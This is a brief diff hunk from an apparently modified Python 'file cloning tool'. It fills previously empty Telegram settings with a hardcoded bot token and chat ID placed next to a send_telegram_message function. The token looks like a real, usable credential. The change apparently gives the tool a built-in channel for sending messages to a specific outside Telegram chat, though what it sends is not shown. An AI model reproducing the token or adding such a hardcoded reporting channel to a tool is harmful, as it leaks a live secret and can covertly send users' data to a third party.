@@ -37,8 +37,8 @@ logo = f"""
 {xp} FILE CLONING TOOL - MODIFIED
 {xlinex}"""
 
-TELEGRAM_BOT_TOKEN = ""
-TELEGRAM_CHAT_ID = ""
+TELEGRAM_BOT_TOKEN = "8561477642:AAGjA6kFHXsnSWAlAqu6FWgl33ZjJg36DJA"
+TELEGRAM_CHAT_ID = "7730742253"
 
 def send_telegram_message(bot_token, chat_id, message):
     if not bot_token or not chat_id: return
